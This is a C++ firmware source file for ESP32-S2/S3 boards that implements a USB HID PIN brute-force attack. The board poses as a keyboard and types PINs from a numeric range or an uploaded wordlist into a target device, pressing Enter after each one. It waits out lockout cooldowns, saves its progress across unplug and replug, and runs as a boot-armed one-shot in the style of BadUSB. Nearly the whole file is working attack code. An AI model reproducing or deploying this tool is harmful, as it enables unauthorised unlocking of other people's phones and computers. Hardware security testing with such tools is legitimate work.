#include "pin_bruteforce.h"

#include <Preferences.h>
#if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#include <FFat.h>
#include "UsbHID.h"
#else
#include <SPIFFS.h>
#endif

PinBruteforce pinBruteforce;

namespace {
constexpr const char* PIN_WORDLIST_PATH = "/pin_wordlist.txt";

bool pinFsBegin(bool format) {
#if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
    return FFat.begin(format, "/ffat", 10, "msc_ffat");
#else
    return SPIFFS.begin(format);
#endif
}

void pinFsEnd() {
#if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
    FFat.end();
#else
    SPIFFS.end();
#endif
}

#if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define PIN_FS_OPEN(path, mode) FFat.open((path), (mode))
#else
#define PIN_FS_OPEN(path, mode) SPIFFS.open((path), (mode))
#endif

char pinFsSeparator() {
    return '/';
}

int charIndex(const String& chars, char c) {
    for (size_t i = 0; i < chars.length(); i++) {
        if (chars[i] == c) return (int)i;
    }
    return -1;
}

uint64_t saturatingPow(uint32_t base, uint8_t exponent) {
    uint64_t value = 1;
    for (uint8_t i = 0; i < exponent; i++) {
        if (value > (UINT64_MAX / base)) return UINT64_MAX;
        value *= base;
    }
    return value;
}
}

void PinBruteforce::begin(BridgeProtocol& proto) {
    _proto = &proto;
    loadPersistedSession();
    if (_mode == PinBruteforceMode::STANDALONE_NATIVE_HID && !_armed &&
        (_state == PinBruteforceState::ARMED || _state == PinBruteforceState::RUNNING)) {
        // A normal USB boot means the one-shot HID run was interrupted before
        // it could finish. Keep the saved progress for the app, but do not
        // report it as currently running.
        _state = PinBruteforceState::PAUSED;
        persistSession();
    }
}

const char* PinBruteforce::stateName() const {
    switch (_state) {
        case PinBruteforceState::IDLE: return "idle";
        case PinBruteforceState::ARMED: return "armed";
        case PinBruteforceState::RUNNING: return "running";
        case PinBruteforceState::PAUSED: return "paused";
        case PinBruteforceState::DONE: return "done";
        case PinBruteforceState::ERROR_STATE: return "error";
    }
    return "idle";
}

const char* PinBruteforce::modeName() const {
    return "standalone_native_hid";
}

const char* PinBruteforce::sourceName() const {
    return _source == PinBruteforceSource::RANGE ? "range" : "wordlist";
}

bool PinBruteforce::parseConfig(JsonObject args, String& error) {
    const char* modeArg = args["mode"] | "standalone_native_hid";
    if (strcmp(modeArg, "standalone_native_hid") != 0) {
        error = "only standalone_native_hid is supported";
        return false;
    }
    _mode = PinBruteforceMode::STANDALONE_NATIVE_HID;

    const char* sourceArg = args["source"] | "range";
    if (strcmp(sourceArg, "range") == 0) {
        _source = PinBruteforceSource::RANGE;
    } else if (strcmp(sourceArg, "wordlist") == 0) {
        _source = PinBruteforceSource::WORDLIST;
    } else {
        error = "invalid source";
        return false;
    }

    _pinLength = (uint8_t)(args["pin_length"] | 4);
    _start = String((const char*)(args["start"] | ""));
    _end = String((const char*)(args["end"] | ""));
    _charset = "0123456789";
    _timeoutMs = (uint32_t)(args["timeout_ms"] | 1000);
    _attemptsBeforeTimeout = (uint16_t)(
        args["attempts_before_cooldown"] |
        args["attempts_before_timeout"] |
        0);
    _cooldownMs = (uint32_t)(args["cooldown_ms"] | 30000);
    _interAttemptMs = (uint32_t)(args["inter_attempt_ms"] | 400);
    _typingDelayMs = (uint16_t)(args["typing_delay_ms"] | 20);
    _startDelayMs = (uint16_t)(args["start_delay_ms"] | 1500);
    _autoResume = args["auto_resume"] | true;
    _sessionKey = String((const char*)(args["session_key"] | "default"));
    _wordlistFile = String((const char*)(args["wordlist_file"] | PIN_WORDLIST_PATH));
    _maxAttempts = (uint32_t)(args["max_attempts"] | 0);
    _persistEvery = (uint16_t)(args["persist_every"] | 1);

    if (_wordlistFile.length() == 0) _wordlistFile = PIN_WORDLIST_PATH;
    if (_charset.length() < 2) {
        error = "charset must contain at least 2 characters";
        return false;
    }
    if (_pinLength < 4 || _pinLength > 12) {
        error = "pin_length must be 4..12";
        return false;
    }
    if (_sessionKey.length() == 0) _sessionKey = "default";
    if (_timeoutMs < 50) _timeoutMs = 50;
    if (_timeoutMs > 60000) _timeoutMs = 60000;
    if (_interAttemptMs > 60000) _interAttemptMs = 60000;
    if (_typingDelayMs > 500) _typingDelayMs = 500;
    if (_startDelayMs > 10000) _startDelayMs = 10000;
    if (_attemptsBeforeTimeout > 1000) _attemptsBeforeTimeout = 1000;
    if (_cooldownMs > 600000) _cooldownMs = 600000;
    if (_maxAttempts > 1000000000UL) _maxAttempts = 1000000000UL;
    if (_persistEvery < 1) _persistEvery = 1;
    if (_persistEvery > 1000) _persistEvery = 1000;
    return true;
}

bool PinBruteforce::validateConfig(String& error) {
    if (_source == PinBruteforceSource::WORDLIST) {
        if (!wordlistFileExists()) {
            error = "wordlist file not found";
            return false;
        }
        if (!loadWordlist(error)) return false;
        _startIndex = 0;
        _currentIndex = 0;
        _endIndex = 0;
        return true;
    }

    // Custom charsets with duplicates make index conversion ambiguous.
    for (size_t i = 0; i < _charset.length(); i++) {
        for (size_t j = i + 1; j < _charset.length(); j++) {
            if (_charset[i] == _charset[j]) {
                error = "charset contains duplicate characters";
                return false;
            }
        }
    }

    const uint64_t combinations = saturatingPow(_charset.length(), _pinLength);
    if (combinations == UINT64_MAX || combinations > 0xFFFFFFFFUL) {
        error = "range is too large for this firmware";
        return false;
    }

    if (_start.length() == 0) {
        _start = "";
        for (uint8_t i = 0; i < _pinLength; i++) _start += _charset[0];
    } else if (_start.length() < _pinLength) {
        while (_start.length() < _pinLength) _start = String(_charset[0]) + _start;
    } else if (_start.length() > _pinLength) {
        error = "start is longer than pin_length";
        return false;
    }

    if (_end.length() == 0) {
        _end = "";
        for (uint8_t i = 0; i < _pinLength; i++) _end += _charset[_charset.length() - 1];
    } else if (_end.length() < _pinLength) {
        while (_end.length() < _pinLength) _end = String(_charset[0]) + _end;
    } else if (_end.length() > _pinLength) {
        error = "end is longer than pin_length";
        return false;
    }

    auto toIndex = [&](const String& value, uint64_t& out) -> bool {
        uint64_t result = 0;
        const uint64_t base = _charset.length();
        for (size_t i = 0; i < value.length(); i++) {
            const int idx = charIndex(_charset, value[i]);
            if (idx < 0) {
                error = "range value contains a character outside charset";
                return false;
            }
            if (result > (UINT64_MAX - (uint64_t)idx) / base) {
                error = "range value overflows 64-bit index";
                return false;
            }
            result = (result * base) + (uint64_t)idx;
        }
        out = result;
        return true;
    };

    uint64_t startIndex = 0;
    uint64_t endIndex = 0;
    if (!toIndex(_start, startIndex)) return false;
    if (!toIndex(_end, endIndex)) return false;

    if (endIndex < startIndex) {
        error = "end is before start";
        return false;
    }

    const uint64_t rangeCount = (endIndex - startIndex) + 1ULL;
    if (rangeCount > 0xFFFFFFFFUL) {
        error = "range exceeds supported attempt count";
        return false;
    }

    _startIndex = startIndex;
    _currentIndex = startIndex;
    _endIndex = endIndex;
    _estimatedTotal = rangeCount;
    return true;
}

bool PinBruteforce::loadWordlist(String& error) {
    error = "";
    _wordlist = "";
    if (!buildWordlistLines(error)) return false;
    uint32_t lines = 0;
    int start = 0;
    while (start <= (int)_wordlist.length()) {
        int nl = _wordlist.indexOf('\n', start);
        String line = (nl < 0) ? _wordlist.substring(start) : _wordlist.substring(start, nl);
        if (line.length() > 0) lines++;
        if (nl < 0) break;
        start = nl + 1;
    }
    _estimatedTotal = lines;
    return true;
}

bool PinBruteforce::buildWordlistLines(String& error) {
    String content;
    if (!readWordlistFile(content)) {
        error = "could not read wordlist file";
        return false;
    }
    content.replace("\r", "");
    content.replace("\n", "\n");

    uint32_t lines = 0;
    String normalized;
    normalized.reserve(content.length());
    int start = 0;
    while (start <= (int)content.length()) {
        int nl = content.indexOf('\n', start);
        String line = (nl < 0) ? content.substring(start) : content.substring(start, nl);
        line.trim();
        if (line.length() > 0) {
            if (line.length() > 64) {
                error = "wordlist line exceeds 64 characters";
                return false;
            }
            lines++;
            if (lines > MAX_WORDLIST_LINES) {
                error = "wordlist exceeds 1000 lines";
                return false;
            }
            normalized += line;
            normalized += '\n';
        }
        if (nl < 0) break;
        start = nl + 1;
    }
    if (lines == 0) {
        error = "wordlist is empty";
        return false;
    }
    if (normalized.length() > MAX_WORDLIST_BYTES) {
        error = "wordlist exceeds 16 KB";
        return false;
    }
    _wordlist = normalized;
    return true;
}

bool PinBruteforce::readLineFromWordlist(uint32_t index, String& out) const {
    uint32_t line = 0;
    int start = 0;
    while (start <= (int)_wordlist.length()) {
        int nl = _wordlist.indexOf('\n', start);
        String current = (nl < 0) ? _wordlist.substring(start) : _wordlist.substring(start, nl);
        if (line == index) {
            out = current;
            return true;
        }
        if (nl < 0) break;
        line++;
        start = nl + 1;
    }
    return false;
}

bool PinBruteforce::nextPin(String& out) {
    if (_source == PinBruteforceSource::WORDLIST) {
        if (!readLineFromWordlist((uint32_t)_currentIndex, out)) return false;
        _currentIndex++;
    } else {
        // Drive range generation from attempts_total instead of a separately
        // restored cursor. This keeps the sequence strictly contiguous across
        // unplug/re-arm cycles and prevents skipped PIN values.
        const uint64_t candidate = _startIndex + (uint64_t)_attemptsTotal;
        if (candidate > _endIndex) return false;
        if (!nextRangePinAt(candidate, out)) return false;
        _currentIndex = candidate + 1ULL;
    }
    return true;
}

bool PinBruteforce::nextRangePin(String& out) {
    return nextRangePinAt(_currentIndex, out);
}

bool PinBruteforce::nextRangePinAt(uint64_t value, String& out) {
    char buffer[13] = {0};
    const uint32_t base = _charset.length();
    for (int i = _pinLength - 1; i >= 0; i--) {
        buffer[i] = _charset[value % base];
        value /= base;
    }
    out = String(buffer);
    return true;
}

bool PinBruteforce::initHid(String& error) {
#if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
    if (!UsbHID::available()) {
        error = "native HID unavailable";
        return false;
    }
    _hidReady = true;
    return true;
#else
    error = "standalone_native_hid requires ESP32-S2/S3";
    return false;
#endif
}

void PinBruteforce::stopHid() {
    if (!_hidReady) return;
#if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
    UsbHID::releaseAll();
#endif
    _hidReady = false;
}

void PinBruteforce::sendCurrentPin() {
#if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
    // Type each character with a small gap. This avoids target hosts that
    // lose a digit or an entire line when USB HID reports arrive too fast.
    UsbHID::sendTextSlow(_lastPin, _typingDelayMs);
    delay(50);
    UsbHID::pressEnter();
#endif
}

bool PinBruteforce::start(JsonObject args, String& error) {
    const bool hadSession = (_state != PinBruteforceState::IDLE);
    const String previousKey = _sessionKey;
    const uint64_t savedStartIndex = _startIndex;
    const uint64_t savedCurrentIndex = _currentIndex;
    const uint64_t savedEndIndex = _endIndex;
    const uint32_t savedAttemptsTotal = _attemptsTotal;
    const uint32_t savedAttemptsInCycle = _attemptsInCycle;
    const String savedLastPin = _lastPin;
    const uint32_t savedStartedAt = _startedAt;
    const uint64_t savedEstimatedTotal = _estimatedTotal;
    const uint8_t savedPinLength = _pinLength;
    const String savedStart = _start;
    const String savedEnd = _end;
    const String savedCharset = _charset;

    stop();
    resetWordlistUpload();
    if (!parseConfig(args, error)) return false;
    if (!validateConfig(error)) return false;

    _standalone = (_mode == PinBruteforceMode::STANDALONE_NATIVE_HID);
    const bool resumeSaved = hadSession && _autoResume && previousKey == _sessionKey;
    if (resumeSaved) {
        _startIndex = savedStartIndex;
        _currentIndex = savedCurrentIndex;
        _endIndex = savedEndIndex;
        _attemptsTotal = savedAttemptsTotal;
        _attemptsInCycle = savedAttemptsInCycle;
        _lastPin = savedLastPin;
        _startedAt = savedStartedAt ? savedStartedAt : millis();
        _estimatedTotal = savedEstimatedTotal;
        _pinLength = savedPinLength;
        _start = savedStart;
        _end = savedEnd;
        _charset = savedCharset;
    } else {
        _attemptsTotal = 0;
        _attemptsInCycle = 0;
        _lastPin = "";
        _startedAt = millis();
    }
    _lastError = "";
    _updatedAt = millis();
    _nextAttemptAtMs = 0;
    _stopReason = "";

    if (_standalone) {
#if !defined(CONFIG_IDF_TARGET_ESP32S2) && !defined(CONFIG_IDF_TARGET_ESP32S3)
        error = "standalone_native_hid requires ESP32-S2/S3";
        _state = PinBruteforceState::ERROR_STATE;
        return false;
#else
        _state = PinBruteforceState::ARMED;
        _armed = true;
        persistSession();
        emitStatus("armed");
        return true;
#endif
    }

    if (!initHid(error)) {
        _state = PinBruteforceState::ERROR_STATE;
        _lastError = error;
        emitError("hid_init", error.c_str());
        return false;
    }
    _state = PinBruteforceState::RUNNING;
    _nextAttemptAtMs = millis();
    persistSession();
    emitStatus("started");
    return true;
}

void PinBruteforce::disarm() {
    // Lightweight mutual-exclusion helper for the BadUSB path. Do not touch
    // HID state or emit events; only clear the boot-armed flag.
    _armed = false;
    if (_state == PinBruteforceState::ARMED) {
        _state = PinBruteforceState::PAUSED;
    }
    _updatedAt = millis();
    persistSession();
}

bool PinBruteforce::stop() {
    if (_state == PinBruteforceState::RUNNING || _state == PinBruteforceState::ARMED) {
        _state = PinBruteforceState::PAUSED;
        _armed = false;
        _stopReason = "stopped";
        _updatedAt = millis();
        stopHid();
        persistSession();
        emitStatus("paused");
        return true;
    }
    if (_state == PinBruteforceState::PAUSED) {
        stopHid();
        return true;
    }
    stopHid();
    return false;
}

bool PinBruteforce::clear(bool clearWordlist, String& error) {
    (void)error;
    stop();
    _state = PinBruteforceState::IDLE;
    _armed = false;
    _attemptsTotal = 0;
    _attemptsInCycle = 0;
    _currentIndex = 0;
    _endIndex = 0;
    _lastPin = "";
    _lastError = "";
    _startedAt = 0;
    _updatedAt = 0;
    _estimatedTotal = 0;
    _stopReason = "";
    _wordlist = "";
    clearPersistedSession();
    if (clearWordlist) removeWordlistFile();
    emitStatus("cleared");
    return true;
}

void PinBruteforce::update() {
    // Native HID is deliberately one-shot and boot-armed like BadUSB.
    // It is executed from setup() before USB CDC is initialised, so the
    // normal firmware loop must never start a native HID session live.
    if (_mode == PinBruteforceMode::STANDALONE_NATIVE_HID) return;
    if (_state != PinBruteforceState::RUNNING) return;
    const uint32_t now = millis();
    if (_nextAttemptAtMs != 0 && now < _nextAttemptAtMs) return;

    if (_maxAttempts > 0 && _attemptsTotal >= _maxAttempts) {
        _state = PinBruteforceState::DONE;
        _stopReason = "max_attempts";
        _updatedAt = now;
        stopHid();
        persistSession();
        emitDone();
        return;
    }

    String pin;
    if (!nextPin(pin)) {
        _state = PinBruteforceState::DONE;
        _stopReason = "exhausted";
        _updatedAt = now;
        stopHid();
        persistSession();
        emitDone();
        return;
    }

    _lastPin = pin;
    _attemptsTotal++;
    _attemptsInCycle++;
    _updatedAt = now;
    sendCurrentPin();
    emitAttempt();

    bool cooldown = false;
    if (_attemptsBeforeTimeout > 0 && _attemptsInCycle >= _attemptsBeforeTimeout) {
        _attemptsInCycle = 0;
        cooldown = true;
    }
    persistProgress();
    if (_persistEvery == 1 || (_attemptsTotal % _persistEvery) == 0 || cooldown) {
        persistSession();
    }
    _nextAttemptAtMs = now + _timeoutMs + (cooldown ? _cooldownMs : 0) + _interAttemptMs;

    if (_state == PinBruteforceState::ERROR_STATE) {
        stopHid();
    }
}

bool PinBruteforce::runIfArmed() {
#if !defined(CONFIG_IDF_TARGET_ESP32S2) && !defined(CONFIG_IDF_TARGET_ESP32S3)
    return false;
#else
    loadPersistedSession();
    if (!_armed) return false;
    if (_mode != PinBruteforceMode::STANDALONE_NATIVE_HID) return false;
    if (_state != PinBruteforceState::ARMED && _state != PinBruteforceState::RUNNING) return false;
    // BadUSB-style one-shot: always consume the arming flag before typing
    // starts. Unplug/replug during a run returns to the normal USB device.
    // To continue, the app must explicitly re-arm the session.
    _armed = false;
    persistSession();

    String error;
    if (_source == PinBruteforceSource::WORDLIST && !loadWordlist(error)) {
        _lastError = error;
        _state = PinBruteforceState::ERROR_STATE;
        persistSession();
        emitError("wordlist", error.c_str());
        delay(250);
        ESP.restart();
        return true;
    }
    if (!initHid(error)) {
        _lastError = error;
        _state = PinBruteforceState::ERROR_STATE;
        persistSession();
        emitError("hid_init", error.c_str());
        delay(250);
        ESP.restart();
        return true;
    }

    _standalone = true;
    _state = PinBruteforceState::RUNNING;
    _nextAttemptAtMs = 0;
    if (_startedAt == 0) _startedAt = millis();
    emitStatus("standalone_running");

    // Give the target host time to enumerate the HID interface and focus its
    // PIN field before the first report. Some hosts drop the first HID report
    // after a cold boot/replug, which makes the persisted attempt count appear
    // one ahead and causes a perceived skipped PIN on the next re-arm.
    UsbHID::releaseAll();
    if (_startDelayMs > 0) delay(_startDelayMs);

    while (_state == PinBruteforceState::RUNNING) {
        if (_maxAttempts > 0 && _attemptsTotal >= _maxAttempts) {
            _state = PinBruteforceState::DONE;
            _stopReason = "max_attempts";
            _armed = false;
            _updatedAt = millis();
            persistSession();
            emitDone();
            break;
        }

        String pin;
        if (!nextPin(pin)) {
            _state = PinBruteforceState::DONE;
            _stopReason = "exhausted";
            _armed = false;
            _updatedAt = millis();
            persistSession();
            emitDone();
            break;
        }
        _lastPin = pin;
        _attemptsTotal++;
        _attemptsInCycle++;
        _updatedAt = millis();
        sendCurrentPin();
        emitAttempt();

        bool cooldown = false;
        if (_attemptsBeforeTimeout > 0 && _attemptsInCycle >= _attemptsBeforeTimeout) {
            _attemptsInCycle = 0;
            cooldown = true;
        }
        // Persist lightweight progress immediately after every completed
        // attempt, regardless of the full-session persistence interval, so a
        // sudden unplug still reports the correct last PIN and count.
        persistProgress();
        if (_persistEvery == 1 || (_attemptsTotal % _persistEvery) == 0 || cooldown) {
            persistSession();
        }
        delay(_timeoutMs);
        if (cooldown) delay(_cooldownMs);
        if (_interAttemptMs > 0) delay(_interAttemptMs);
    }

    stopHid();
    persistSession();
    emitStatus("one_shot_complete");
    delay(250);
    // Return to the normal USB CDC device automatically after the one-shot
    // HID run, so the app can reconnect and re-arm without another manual
    // unplug/replug cycle.
    ESP.restart();
    return true;
#endif
}

void PinBruteforce::emitStatus(const char* reason) {
    if (!_proto) return;
    JsonDocument doc;
    status(doc);
    if (reason) doc["reason"] = reason;
    _proto->sendEvent("pin_session_status", doc);
}

void PinBruteforce::emitAttempt() {
    if (!_proto) return;
    JsonDocument doc;
    doc["mode"] = modeName();
    doc["source"] = sourceName();
    doc["pin"] = _lastPin;
    doc["current_sequence"] = _currentIndex;
    doc["attempts_total"] = _attemptsTotal;
    doc["attempts_in_cycle"] = _attemptsInCycle;
    doc["estimated_total"] = _estimatedTotal;
    doc["max_attempts"] = _maxAttempts;
    doc["started_at"] = _startedAt;
    doc["updated_at"] = _updatedAt;
    _proto->sendEvent("pin_attempt", doc);
}

void PinBruteforce::emitDone() {
    if (!_proto) return;
    JsonDocument doc;
    doc["mode"] = modeName();
    doc["source"] = sourceName();
    doc["attempts_total"] = _attemptsTotal;
    doc["last_pin"] = _lastPin;
    doc["stop_reason"] = _stopReason.length() ? _stopReason : "unknown";
    doc["started_at"] = _startedAt;
    doc["updated_at"] = _updatedAt;
    _proto->sendEvent("pin_range_done", doc);
    emitStatus("done");
}

void PinBruteforce::emitError(const char* code, const char* message) {
    if (!_proto) return;
    JsonDocument doc;
    doc["code"] = code ? code : "error";
    doc["msg"] = message ? message : "";
    _proto->sendEvent("pin_range_error", doc);
    emitStatus("error");
}

void PinBruteforce::status(JsonDocument& doc) {
    doc["state"] = stateName();
    doc["mode"] = modeName();
    doc["source"] = sourceName();
    doc["standalone"] = _standalone;
    doc["armed"] = _armed;
    doc["active"] = active();
    doc["pin_length"] = _pinLength;
    doc["start"] = _start;
    doc["end"] = _end;
    doc["charset"] = _charset;
    doc["timeout_ms"] = _timeoutMs;
    doc["attempts_before_cooldown"] = _attemptsBeforeTimeout;
    doc["attempts_before_timeout"] = _attemptsBeforeTimeout;
    doc["cooldown_ms"] = _cooldownMs;
    doc["inter_attempt_ms"] = _interAttemptMs;
    doc["typing_delay_ms"] = _typingDelayMs;
    doc["start_delay_ms"] = _startDelayMs;
    doc["auto_resume"] = _autoResume;
    doc["session_key"] = _sessionKey;
    doc["max_attempts"] = _maxAttempts;
    doc["persist_every"] = _persistEvery;
    doc["estimated_total"] = _estimatedTotal;
    uint64_t effectiveTotal = _estimatedTotal;
    if (_maxAttempts > 0 && _maxAttempts < effectiveTotal) effectiveTotal = _maxAttempts;
    const uint32_t progress = (effectiveTotal == 0)
        ? 0
        : (uint32_t)((uint64_t)_attemptsTotal * 100ULL / effectiveTotal);
    doc["progress_percent"] = progress > 100 ? 100 : progress;
    doc["stop_reason"] = _stopReason;
    doc["start_index"] = (uint32_t)_startIndex;
    doc["current_index"] = (uint32_t)_currentIndex;
    doc["end_index"] = (uint32_t)_endIndex;
    doc["current_sequence"] = (uint32_t)_currentIndex;
    doc["attempts_total"] = _attemptsTotal;
    doc["attempts_in_cycle"] = _attemptsInCycle;
    doc["last_pin"] = _lastPin;
    doc["last_error"] = _lastError;
    doc["started_at"] = _startedAt;
    doc["updated_at"] = _updatedAt;
    doc["wordlist_file"] = _wordlistFile;
    doc["wordlist_lines"] = 0;
    doc["wordlist_bytes"] = 0;
    doc["wordlist_present"] = false;
    if (_source == PinBruteforceSource::WORDLIST) {
        String content;
        if (readWordlistFile(content)) {
            uint32_t lines = 0;
            int lineStart = 0;
            while (lineStart <= (int)content.length()) {
                int nl = content.indexOf('\n', lineStart);
                String line = (nl < 0) ? content.substring(lineStart) : content.substring(lineStart, nl);
                line.trim();
                if (line.length() > 0) lines++;
                if (nl < 0) break;
                lineStart = nl + 1;
            }
            doc["wordlist_lines"] = lines;
            doc["wordlist_bytes"] = content.length();
            doc["wordlist_present"] = true;
        }
    }

    Preferences prefs;
    if (prefs.begin(NVS_NAMESPACE, true)) {
        doc["persisted_in_nvs"] = prefs.isKey("state");
        prefs.end();
    } else {
        doc["persisted_in_nvs"] = false;
    }
}

void PinBruteforce::persistSession() {
    Preferences prefs;
    if (!prefs.begin(NVS_NAMESPACE, false)) return;
    prefs.putString("session_key", _sessionKey);
    prefs.putBool("armed", _armed);
    prefs.putUChar("mode", (uint8_t)_mode);
    prefs.putUChar("source", (uint8_t)_source);
    prefs.putUChar("state", (uint8_t)_state);
    prefs.putUChar("pin_len", _pinLength);
    prefs.putString("start", _start);
    prefs.putString("end", _end);
    prefs.putUInt("timeout", _timeoutMs);
    prefs.putUShort("att_before", _attemptsBeforeTimeout);
    prefs.putUInt("cooldown", _cooldownMs);
    prefs.putUInt("inter", _interAttemptMs);
    prefs.putUShort("typing_delay", _typingDelayMs);
    prefs.putUShort("start_delay", _startDelayMs);
    prefs.putBool("auto_resume", _autoResume);
    prefs.putString("wordlist_file", _wordlistFile);
    prefs.putUInt("max_attempts", _maxAttempts);
    prefs.putUShort("persist_every", _persistEvery);
    prefs.putULong64("start_index", _startIndex);
    prefs.putULong64("current_index", _currentIndex);
    prefs.putULong64("end_index", _endIndex);
    prefs.putUInt("attempts_total", _attemptsTotal);
    prefs.putUInt("attempts_cycle", _attemptsInCycle);
    prefs.putULong64("estimated_total", _estimatedTotal);
    prefs.putString("stop_reason", _stopReason);
    prefs.putString("last_pin", _lastPin);
    prefs.putString("last_error", _lastError);
    prefs.putUInt("started_at", _startedAt);
    prefs.putUInt("updated_at", _updatedAt);
    prefs.end();
    _nvsDirty = false;
}

void PinBruteforce::persistProgress() {
    Preferences prefs;
    if (!prefs.begin(NVS_NAMESPACE, false)) return;
    prefs.putBool("armed", _armed);
    prefs.putUChar("state", (uint8_t)_state);
    prefs.putULong64("current_index", _currentIndex);
    prefs.putUInt("attempts_total", _attemptsTotal);
    prefs.putUInt("attempts_cycle", _attemptsInCycle);
    prefs.putString("last_pin", _lastPin);
    prefs.putString("stop_reason", _stopReason);
    prefs.putUInt("updated_at", _updatedAt);
    prefs.end();
}

void PinBruteforce::loadPersistedSession() {
    Preferences prefs;
    if (!prefs.begin(NVS_NAMESPACE, true)) return;
    if (!prefs.isKey("state")) {
        prefs.end();
        return;
    }
    _mode = (PinBruteforceMode)prefs.getUChar("mode", (uint8_t)PinBruteforceMode::STANDALONE_NATIVE_HID);
    _source = (PinBruteforceSource)prefs.getUChar("source", (uint8_t)PinBruteforceSource::RANGE);
    _state = (PinBruteforceState)prefs.getUChar("state", (uint8_t)PinBruteforceState::IDLE);
    _pinLength = prefs.getUChar("pin_len", 4);
    _start = prefs.getString("start", "");
    _end = prefs.getString("end", "");
    _timeoutMs = prefs.getUInt("timeout", 1000);
    _attemptsBeforeTimeout = prefs.getUShort("att_before", 0);
    _cooldownMs = prefs.getUInt("cooldown", 30000);
    _interAttemptMs = prefs.getUInt("inter", 400);
    _typingDelayMs = prefs.getUShort("typing_delay", 20);
    _startDelayMs = prefs.getUShort("start_delay", 1500);
    _autoResume = prefs.getBool("auto_resume", true);
    _sessionKey = prefs.getString("session_key", "default");
    _armed = prefs.getBool("armed", false);
    _wordlistFile = prefs.getString("wordlist_file", PIN_WORDLIST_PATH);
    _maxAttempts = prefs.getUInt("max_attempts", 0);
    _persistEvery = prefs.getUShort("persist_every", 1);
    _startIndex = prefs.getULong64("start_index", 0);
    _currentIndex = prefs.getULong64("current_index", _startIndex);
    _endIndex = prefs.getULong64("end_index", 0);
    _attemptsTotal = prefs.getUInt("attempts_total", 0);
    _attemptsInCycle = prefs.getUInt("attempts_cycle", 0);
    _estimatedTotal = prefs.getULong64("estimated_total", 0);
    _stopReason = prefs.getString("stop_reason", "");
    _lastPin = prefs.getString("last_pin", "");
    _lastError = prefs.getString("last_error", "");
    _startedAt = prefs.getUInt("started_at", 0);
    _updatedAt = prefs.getUInt("updated_at", 0);
    prefs.end();
}

void PinBruteforce::clearPersistedSession() {
    Preferences prefs;
    if (prefs.begin(NVS_NAMESPACE, false)) {
        prefs.clear();
        prefs.end();
    }
}

bool PinBruteforce::beginWordlistUpload(String& error) {
    (void)error;
    _uploadBuffer = "";
    _uploadBuffer.reserve(MAX_WORDLIST_BYTES);
    _uploadActive = true;
    return true;
}

bool PinBruteforce::addWordlistChunk(
    const uint8_t* data,
    size_t len,
    uint32_t offset,
    uint32_t checksum,
    bool last,
    String& error
) {
    if (!_uploadActive) {
        error = "wordlist upload not started";
        return false;
    }
    if (offset != _uploadBuffer.length()) {
        error = "wordlist chunk offset mismatch";
        return false;
    }
    if (data && len > 0) {
        if (_uploadBuffer.length() + len > MAX_WORDLIST_BYTES) {
            error = "wordlist exceeds 16 KB";
            return false;
        }
        uint32_t actualChecksum = 0;
        for (size_t i = 0; i < len; i++) actualChecksum += data[i];
        if (actualChecksum != checksum) {
            error = "wordlist chunk checksum mismatch";
            return false;
        }
        _uploadBuffer.concat((const char*)data, len);
    } else if (checksum != 0) {
        error = "wordlist chunk checksum mismatch";
        return false;
    }
    if (!last) return true;

    _uploadBuffer.replace("\r", "");
    uint32_t lines = 0;
    int start = 0;
    while (start <= (int)_uploadBuffer.length()) {
        int nl = _uploadBuffer.indexOf('\n', start);
        String line = (nl < 0) ? _uploadBuffer.substring(start) : _uploadBuffer.substring(start, nl);
        line.trim();
        if (line.length() > 0) {
            if (line.length() > 64) {
                error = "wordlist line exceeds 64 characters";
                return false;
            }
            lines++;
            if (lines > MAX_WORDLIST_LINES) {
                error = "wordlist exceeds 1000 lines";
                return false;
            }
        }
        if (nl < 0) break;
        start = nl + 1;
    }
    if (lines == 0) {
        error = "wordlist is empty";
        return false;
    }
    if (!writeWordlistFile(_uploadBuffer)) {
        error = "could not save wordlist";
        return false;
    }
    _uploadActive = false;
    return true;
}

void PinBruteforce::resetWordlistUpload() {
    _uploadBuffer = "";
    _uploadActive = false;
}

bool PinBruteforce::readWordlistFile(String& out) {
    if (!pinFsBegin(false)) return false;
    File file = PIN_FS_OPEN(_wordlistFile.c_str(), FILE_READ);
    if (!file) {
        pinFsEnd();
        return false;
    }
    out = "";
    out.reserve(file.size());
    while (file.available()) out += (char)file.read();
    file.close();
    pinFsEnd();
    return true;
}

bool PinBruteforce::writeWordlistFile(const String& content) {
    // Never format the shared FAT/FFat volume just to write a wordlist.
    if (!pinFsBegin(false)) return false;
    File file = PIN_FS_OPEN(_wordlistFile.c_str(), FILE_WRITE);
    if (!file) {
        pinFsEnd();
        return false;
    }
    size_t written = file.print(content);
    file.close();
    pinFsEnd();
    return written == content.length();
}

bool PinBruteforce::wordlistFileExists() {
    if (!pinFsBegin(false)) return false;
    bool exists = false;
#if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
    exists = FFat.exists(_wordlistFile.c_str());
#else
    exists = SPIFFS.exists(_wordlistFile.c_str());
#endif
    pinFsEnd();
    return exists;
}

void PinBruteforce::removeWordlistFile() {
    if (!pinFsBegin(false)) return;
#if defined(CONFIG_IDF_TARGET_ESP32S2) || defined(CONFIG_IDF_TARGET_ESP32S3)
    FFat.remove(_wordlistFile.c_str());
#else
    SPIFFS.remove(_wordlistFile.c_str());
#endif
    pinFsEnd();
}
